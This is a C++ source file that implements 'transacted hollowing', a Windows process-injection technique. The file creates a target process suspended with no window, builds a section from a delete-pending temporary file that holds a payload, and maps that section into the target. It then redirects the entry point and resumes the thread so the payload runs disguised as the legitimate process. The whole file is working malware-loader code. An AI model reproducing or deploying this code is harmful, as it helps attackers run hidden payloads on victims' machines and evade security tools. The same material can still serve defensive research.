#include <windows.h>

#include <iostream>
#include <stdio.h>
#include <map>
#include <mutex>


#include "../include/ntddk.h"
#include "../include/kernel32_undoc.h"
#include "../include/util.h"
#include "../include/encryption.h"

#include "../include/process_info.h"
#include "../include/pe_hdrs_helper.h"
#include "../include/hollowing_parts.h"
#include "../include/delete_pending_file.h"
#include "../include/http_client.h"
#include "../include/json_printer.h"


bool create_new_process_internal(PROCESS_INFORMATION &pi, LPWSTR targetPath, LPWSTR args = NULL, LPWSTR startDir = NULL)
{
    if (!load_kernel32_functions()) return false;

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(STARTUPINFOW);

    memset(&pi, 0, sizeof(PROCESS_INFORMATION));

    // Combine the target path and arguments into a single command line
    wchar_t cmdLine[MAX_PATH * 2] = {0};
    if (args != NULL && args[0] != L'\0') {
        swprintf_s(cmdLine, L"\"%s\" %s", targetPath, args);
    } else {
        swprintf_s(cmdLine, L"\"%s\"", targetPath);
    }

    HANDLE hToken = NULL;
    HANDLE hNewToken = NULL;
    if (!CreateProcessInternalW(hToken,
        NULL, // lpApplicationName
        cmdLine, // lpCommandLine (now includes arguments)
        NULL, // lpProcessAttributes
        NULL, // lpThreadAttributes
        FALSE, // bInheritHandles
        CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW, // dwCreationFlags
        NULL, // lpEnvironment 
        startDir, // lpCurrentDirectory
        &si, // lpStartupInfo
        &pi, // lpProcessInformation
        &hNewToken
    ))
    {
        printf("[ERROR] CreateProcessInternalW failed, Error = %x\n", GetLastError());
        return false;
    }
    return true;
}

PVOID map_buffer_into_process(HANDLE hProcess, HANDLE hSection)
{
    NTSTATUS status = STATUS_SUCCESS;
    SIZE_T viewSize = 0;
    PVOID sectionBaseAddress = 0;

    if ((status = NtMapViewOfSection(hSection, hProcess, &sectionBaseAddress, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_READONLY)) != STATUS_SUCCESS)
    {
        if (status == STATUS_IMAGE_NOT_AT_BASE) {
            std::cerr << "[WARNING] Image could not be mapped at its original base! If the payload has no relocations, it won't work!\n";
        }
        else {
            std::cerr << "[ERROR] NtMapViewOfSection failed, status: " << std::hex << status << std::endl;
            return NULL;
        }
    }
    
    std::cout << "Mapped Base:\t" << std::hex << (ULONG_PTR)sectionBaseAddress << "\n";
    std::cout << "View Size:\t" << std::hex << viewSize << "\n";
    
    // After mapping, add a small delay to ensure the mapping is fully committed
    Sleep(20);
    
    // Flush the process' working set to ensure pages are present
    // This helps prevent page faults during early execution
    if (!FlushViewOfFile(sectionBaseAddress, viewSize)) {
        std::cerr << "[WARNING] Failed to flush view of file, but continuing...\n";
    }
    
    return sectionBaseAddress;
}

DWORD transacted_hollowing(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize, LPWSTR args)
{
    wchar_t dummy_name[MAX_PATH] = { 0 };
    wchar_t temp_path[MAX_PATH] = { 0 };
    DWORD size = GetTempPathW(MAX_PATH, temp_path);
    GetTempFileNameW(temp_path, L"TH", 0, dummy_name);
    HANDLE hSection = make_section_from_delete_pending_file(dummy_name, payladBuf, payloadSize);


    if (!hSection || hSection == INVALID_HANDLE_VALUE) {
        std::cout << "Creating transacted section has failed!\n";
        return false;
    }
    wchar_t *start_dir = NULL;
    wchar_t dir_path[MAX_PATH] = { 0 };
    get_directory(targetPath, dir_path, NULL);
    if (wcsnlen(dir_path, MAX_PATH) > 0) {
        start_dir = dir_path;
    }
    PROCESS_INFORMATION pi = { 0 };
    if (!create_new_process_internal(pi, targetPath, args, start_dir)) {
        std::cerr << "Creating process failed!\n";
        return false;
    }

    ProcessStorage::AddProcess(pi.dwProcessId, pi);
    std::cout << "Created Process, PID: " << std::dec << pi.dwProcessId << "\n";
    HANDLE hProcess = pi.hProcess;
    PVOID remote_base = map_buffer_into_process(hProcess, hSection);
    if (!remote_base) {
        std::cerr << "Failed mapping the buffer!\n";
        return false;
    }
    bool isPayl32b = !pe_is64bit(payladBuf);
    if (!redirect_to_payload(payladBuf, remote_base, pi, isPayl32b)) {
        std::cerr << "Failed to redirect!\n";
        return false;
    }
    
    std::cout << "Redirected entry point, waiting for initialization...\n";
    
    // Critical: Add delay to ensure the injected code is fully initialized
    // The system needs time to:
    // 1. Flush any outstanding memory writes
    // 2. Update TLB entries
    // 3. Prepare the injected thread for execution
    Sleep(100);  // 100ms delay for system stabilization
    
    // Flush instruction cache to ensure the CPU sees the new code
    FlushInstructionCache(pi.hProcess, remote_base, payloadSize);
    
    // Add another small delay after cache flush
    Sleep(50);
    
    std::cout << "Resuming thread, PID " << std::dec << pi.dwProcessId << std::endl;
    
    // Resume the thread and let the payload run
    if (!ResumeThread(pi.hThread)) {
        std::cerr << "Failed to resume thread! Error: " << GetLastError() << "\n";
        // Clean up on failure
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }
    
    std::cout << "Thread resumed successfully, payload executing...\n";
    return pi.dwProcessId;
}
